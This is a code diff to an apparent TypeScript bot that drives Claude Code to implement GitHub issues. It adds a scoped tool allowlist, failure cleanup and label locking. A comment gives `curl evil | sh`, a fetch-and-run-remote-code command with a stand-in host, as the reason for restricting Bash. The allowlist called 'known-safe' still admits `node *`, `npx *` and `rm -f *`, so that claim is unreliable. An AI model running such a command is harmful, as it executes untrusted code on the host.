@@ -52,6 +52,34 @@ export type ImplementerInput = {
   issue: IssueForPrompt;
 };
 
+/**
+ * Tools the implementer is allowed to use inside Claude Code.
+ *
+ * Two non-obvious choices:
+ *  - `Bash(...)` is SCOPED to known-safe commands. Unconstrained `Bash` would
+ *    let the model do `curl evil | sh`. We allow node/python/rust/go test
+ *    runners plus read-only git inspection, nothing else.
+ *  - **No `git commit / push / checkout / stash` for the model.** Git state
+ *    transitions are the bot's job, not Claude's. The bot drives commit/push
+ *    after verification, and stash/checkout for the mutation-light check.
+ */
+const IMPLEMENTER_ALLOWED_TOOLS = [
+  // node/npm
+  "Bash(npm *)", "Bash(npx *)", "Bash(node *)", "Bash(pnpm *)",
+  // testers
+  "Bash(jest *)", "Bash(vitest *)", "Bash(pytest *)", "Bash(go test *)",
+  // build/typecheck/lint
+  "Bash(cargo *)", "Bash(tsc *)", "Bash(eslint *)", "Bash(prettier *)",
+  // read-only git
+  "Bash(git status *)", "Bash(git diff *)", "Bash(git log *)",
+  // filesystem inspection
+  "Bash(ls *)", "Bash(cat *)", "Bash(grep *)", "Bash(find *)",
+  // safe create
+  "Bash(mkdir *)", "Bash(rm -f *)",
+  // Claude-native
+  "Read", "Edit", "Write", "Glob", "Grep",
+];
+
 function createRunRow(input: ImplementerInput): number {
   const info = db
     .prepare(
@@ -89,6 +117,52 @@ function saveArtifact(runId: number, kind: string, content: string) {
   ).run(runId, kind, content, Date.now());
 }
 
+/**
+ * Slimmed-down verdict text for the iteration prompt. We only feed back the
+ * FAILING checks with a short tail of stdout — the full verdict (all 8 checks,
+ * full stdout dumps) can balloon to 30 KB and dilutes the failure signal.
+ */
+function verdictForRetry(v: Verdict): string {
+  const failing = Object.values(v.checks).filter((c) => !c.pass);
+  return failing
+    .map((c) => {
+      const detail = c.detail as { stdoutTail?: string } | undefined;
+      const tail = detail?.stdoutTail?.slice(-200) ?? "";
+      const indented = tail.replace(/\n/g, "\n    ");
+      return `- ${c.name} (${c.hardGate ? "HARD" : "soft"}): ${c.message}${tail ? `\n    ${indented}` : ""}`;
+    })
+    .join("\n");
+}
+
+/**
+ * Drop the bot-claimed and bot-please labels off the issue. Idempotent —
+ * fine to call multiple times. Best-effort: a failure here shouldn't fail
+ * the run.
+ */
+async function cleanupLabels(args: {
+  owner: string;
+  repo: string;
+  issue_number: number;
+  alsoRemovePlease: boolean;
+}) {
+  await Promise.allSettled([
+    removeLabel({
+      owner: args.owner,
+      repo: args.repo,
+      issue_number: args.issue_number,
+      label: botConfig.labels.claimed,
+    }),
+    args.alsoRemovePlease
+      ? removeLabel({
+          owner: args.owner,
+          repo: args.repo,
+          issue_number: args.issue_number,
+          label: botConfig.labels.request,
+        })
+      : Promise.resolve(),
+  ]);
+}
+
 export async function runImplementer(input: ImplementerInput): Promise<{
   runId: number;
   outcome: "succeeded" | "needs-review" | "abandoned" | "failed";
@@ -97,7 +171,10 @@ export async function runImplementer(input: ImplementerInput): Promise<{
 }> {
   const day = dayBudgetOk();
   if (!day.ok) {
-    log.warn("implementer", `daily budget exceeded ($${day.spentUsd.toFixed(2)}) — skipping issue #${input.issue.number}`);
+    log.warn(
+      "implementer",
+      `daily budget exceeded ($${day.spentUsd.toFixed(2)}) — skipping issue #${input.issue.number}`,
+    );
     throw new Error(`Daily budget exceeded ($${day.spentUsd.toFixed(2)})`);
   }
   const issueBudget = issueBudgetOk(
@@ -105,25 +182,49 @@ export async function runImplementer(input: ImplementerInput): Promise<{
     input.issue.number,
   );
   if (!issueBudget.ok) {
-    log.warn("implementer", `per-issue budget exceeded for #${input.issue.number} ($${issueBudget.spentUsd.toFixed(2)})`);
-    throw new Error(`Per-issue budget exceeded for #${input.issue.number}`);
+    log.warn(
+      "implementer",
+      `per-issue budget exceeded for #${input.issue.number} ($${issueBudget.spentUsd.toFixed(2)})`,
+    );
+    throw new Error(
+      `Per-issue budget exceeded for #${input.issue.number}`,
+    );
   }
 
   const runId = createRunRow(input);
   emitEvent(runId, "run.created", { type: "implement", issue: input.issue.number });
+
+  // A1: apply the bot-claimed label IMMEDIATELY as the cross-process lock.
+  // Anything that opens the run row but fails before label-application is
+  // fine — the recoverCrashedRuns sweep on next coordinator boot will fix it.
+  await addLabel({
+    owner: input.owner,
+    repo: input.repo,
+    issue_number: input.issue.number,
+    label: botConfig.labels.claimed,
+  }).catch((err) =>
+    log.warn("implementer", `could not apply bot-claimed: ${err}`),
+  );
+
   updateRun(runId, { status: "planning" });
   emitEvent(runId, "run.status", { status: "planning" });
 
-  // 1. Worktree
-  const { branch, worktreePath } = await createWorktree({
-    repoDir: input.repoDir,
-    issueNumber: input.issue.number,
-    baseBranch: input.baseBranch,
-  });
-  assertNotProtected(branch);
-  updateRun(runId, { branch_name: branch, worktree_path: worktreePath });
+  let worktreePath: string | null = null;
+  let branch: string | null = null;
 
   try {
+    // 1. Worktree — wrapped in try so creation failures route through the
+    //    standard finalize-and-clean-labels path.
+    const wt = await createWorktree({
+      repoDir: input.repoDir,
+      issueNumber: input.issue.number,
+      baseBranch: input.baseBranch,
+    });
+    branch = wt.branch;
+    worktreePath = wt.worktreePath;
+    assertNotProtected(branch);
+    updateRun(runId, { branch_name: branch, worktree_path: worktreePath });
+
     // 2. Plan
     emitEvent(runId, "plan.started", {});
     const repoSummary = await getRepoSummary(worktreePath);
@@ -136,10 +237,26 @@ export async function runImplementer(input: ImplementerInput): Promise<{
       costBudgetUsd: botConfig.budgets.perRunUsd,
     });
     if (!planRes.ok) {
+      // A8: capture the partial cost even on planner failure.
+      if (planRes.partialCostUsd) incCost(runId, planRes.partialCostUsd);
       emitEvent(runId, "plan.aborted", { reason: planRes.error });
-      updateRun(runId, { status: "failed", finished_at: Date.now(), error_message: planRes.error });
-      await removeLabel({ owner: input.owner, repo: input.repo, issue_number: input.issue.number, label: botConfig.labels.claimed }).catch(() => {});
-      await removeWorktree({ repoDir: input.repoDir, worktreePath, force: true });
+      updateRun(runId, {
+        status: "failed",
+        finished_at: Date.now(),
+        error_message: planRes.error,
+      });
+      await cleanupLabels({
+        owner: input.owner,
+        repo: input.repo,
+        issue_number: input.issue.number,
+        alsoRemovePlease: false,
+      });
+      if (worktreePath)
+        await removeWorktree({
+          repoDir: input.repoDir,
+          worktreePath,
+          force: true,
+        });
       return { runId, outcome: "failed" };
     }
     incCost(runId, planRes.costUsd);
@@ -158,19 +275,25 @@ export async function runImplementer(input: ImplementerInput): Promise<{
         issue_number: input.issue.number,
         body: `🤖 The bot examined this issue and chose not to attempt an implementation.\n\n**Reason:** ${reason}`,
       }).catch(() => {});
-      await removeLabel({
+      // The bot bows out gracefully — leave bot-please on so a human can
+      // re-decide; just remove the claim.
+      await cleanupLabels({
         owner: input.owner,
         repo: input.repo,
         issue_number: input.issue.number,
-        label: botConfig.labels.claimed,
-      }).catch(() => {});
+        alsoRemovePlease: false,
+      });
       updateRun(runId, {
         status: "abandoned",
         finished_at: Date.now(),
         error_message: `plan abort: ${reason}`,
       });
       emitEvent(runId, "run.finished", { outcome: "abandoned" });
-      await removeWorktree({ repoDir: input.repoDir, worktreePath, force: true });
+      await removeWorktree({
+        repoDir: input.repoDir,
+        worktreePath,
+        force: true,
+      });
       return { runId, outcome: "abandoned" };
     }
 
@@ -185,12 +308,14 @@ export async function runImplementer(input: ImplementerInput): Promise<{
       attempt += 1;
       updateRun(runId, { attempts: attempt });
 
-      const prompt = attempt === 1
-        ? implementPrompt(input.issue, planRes.plan)
-        : iterationPrompt(
-            JSON.stringify(lastVerdict, null, 2),
-            JSON.stringify(planRes.plan, null, 2),
-          );
+      const prompt =
+        attempt === 1
+          ? implementPrompt(input.issue, planRes.plan)
+          : // B2: slim retry payload — only failing checks + 200-char tails.
+            iterationPrompt(
+              verdictForRetry(lastVerdict!),
+              JSON.stringify(planRes.plan, null, 2),
+            );
 
       if (attempt > 1) {
         emitEvent(runId, "iteration.started", { attempt });
@@ -204,32 +329,37 @@ export async function runImplementer(input: ImplementerInput): Promise<{
         mode: "implement",
         prompt,
         cwd: worktreePath,
-        allowedTools: ["Bash", "Read", "Edit", "Write", "Glob", "Grep"],
+        // A5: scoped Bash + no git mutation tools for the model.
+        allowedTools: IMPLEMENTER_ALLOWED_TOOLS,
         permissionMode: "acceptEdits",
         resumeSessionId: lastSessionId,
         costBudgetUsd: botConfig.budgets.perRunUsd,
       });
       if (impl.ok) lastSessionId = impl.sessionId;
-      incCost(runId, impl.ok ? impl.costUsd : impl.partialCostUsd ?? 0);
+      incCost(runId, impl.ok ? impl.costUsd : (impl.partialCostUsd ?? 0));
 
       if (!impl.ok) {
         emitEvent(runId, "implement.failed", {
           kind: impl.errorKind,
           message: impl.errorMessage,
         });
-        // For wrapper failures (timeout / hang / budget) we don't retry. Fail.
+        // Wrapper failures (timeout / hang / budget) are non-retryable. Fail.
         updateRun(runId, {
           status: "failed",
           finished_at: Date.now(),
           error_message: `${impl.errorKind}: ${impl.errorMessage}`,
         });
-        await removeLabel({
+        await cleanupLabels({
           owner: input.owner,
           repo: input.repo,
           issue_number: input.issue.number,
-          label: botConfig.labels.claimed,
-        }).catch(() => {});
-        await removeWorktree({ repoDir: input.repoDir, worktreePath, force: true });
+          alsoRemovePlease: false,
+        });
+        await removeWorktree({
+          repoDir: input.repoDir,
+          worktreePath,
+          force: true,
+        });
         return { runId, outcome: "failed" };
       }
       emitEvent(runId, "implement.completed", {});
@@ -244,6 +374,35 @@ export async function runImplementer(input: ImplementerInput): Promise<{
         plan: planRes.plan,
         issue: input.issue,
       });
+
+      // A6: if mutation-light blew up the worktree, bail immediately — no
+      // sense iterating in a corrupted tree.
+      const mutationDetail = lastVerdict.checks.mutation_light.detail as
+        | { popStderr?: string; broken?: boolean }
+        | undefined;
+      if (mutationDetail?.popStderr || mutationDetail?.broken) {
+        emitEvent(runId, "run.worktree_broken", {
+          detail: mutationDetail,
+        });
+        updateRun(runId, {
+          status: "failed",
+          finished_at: Date.now(),
+          error_message: "worktree state corrupted during mutation check",
+        });
+        await cleanupLabels({
+          owner: input.owner,
+          repo: input.repo,
+          issue_number: input.issue.number,
+          alsoRemovePlease: false,
+        });
+        await removeWorktree({
+          repoDir: input.repoDir,
+          worktreePath,
+          force: true,
+        });
+        return { runId, outcome: "failed" };
+      }
+
       if (lastVerdict.pass) break;
     }
 
@@ -254,21 +413,29 @@ export async function runImplementer(input: ImplementerInput): Promise<{
     await git.add(["-A"]);
     const status = await git.status();
     if (!status.files.length) {
-      // Implementer produced no diff. Mark failed.
       updateRun(runId, {
         status: "failed",
         finished_at: Date.now(),
         error_message: "no diff produced",
       });
-      await removeLabel({ owner: input.owner, repo: input.repo, issue_number: input.issue.number, label: botConfig.labels.claimed }).catch(() => {});
-      await removeWorktree({ repoDir: input.repoDir, worktreePath, force: true });
+      await cleanupLabels({
+        owner: input.owner,
+        repo: input.repo,
+        issue_number: input.issue.number,
+        alsoRemovePlease: false,
+      });
+      await removeWorktree({
+        repoDir: input.repoDir,
+        worktreePath,
+        force: true,
+      });
       return { runId, outcome: "failed" };
     }
     const summary = planRes.plan.user_visible_change;
     await git.commit(
       `bot: ${input.issue.title}\n\nCloses #${input.issue.number}\n\n${summary}\n\nPrompt-version: ${PROMPT_VERSION}`,
     );
-    await git.push("origin", branch, ["--set-upstream"]);
+    await git.push("origin", branch!, ["--set-upstream"]);
 
     const costRow = db
       .prepare(`SELECT cost_usd FROM runs WHERE id = ?`)
@@ -286,7 +453,7 @@ export async function runImplementer(input: ImplementerInput): Promise<{
     const pr = await openPullRequest({
       owner: input.owner,
       repo: input.repo,
-      head: branch,
+      head: branch!,
       base: input.baseBranch,
       title: `bot: ${input.issue.title}`,
       body: prBody,
@@ -305,6 +472,15 @@ export async function runImplementer(input: ImplementerInput): Promise<{
     });
     emitEvent(runId, "run.finished", {
       outcome: needsReview ? "needs-review" : "pr-opened",
+    });
+
+    // A2: PR is now the source of truth. Drop both bot-please AND bot-claimed
+    // so a stale-runs sweep can't pick this issue up again later.
+    await cleanupLabels({
+      owner: input.owner,
+      repo: input.repo,
+      issue_number: input.issue.number,
+      alsoRemovePlease: true,
     });
 
     if (needsReview) {
@@ -330,11 +506,21 @@ export async function runImplementer(input: ImplementerInput): Promise<{
       finished_at: Date.now(),
       error_message: message,
     });
-    await removeWorktree({
-      repoDir: input.repoDir,
-      worktreePath,
-      force: true,
-    }).catch(() => {});
+    // B9: also covers the case where createWorktree itself threw before
+    // setting worktreePath. cleanupLabels is best-effort.
+    await cleanupLabels({
+      owner: input.owner,
+      repo: input.repo,
+      issue_number: input.issue.number,
+      alsoRemovePlease: false,
+    });
+    if (worktreePath) {
+      await removeWorktree({
+        repoDir: input.repoDir,
+        worktreePath,
+        force: true,
+      }).catch(() => {});
+    }
     return { runId, outcome: "failed" };
   }
 }
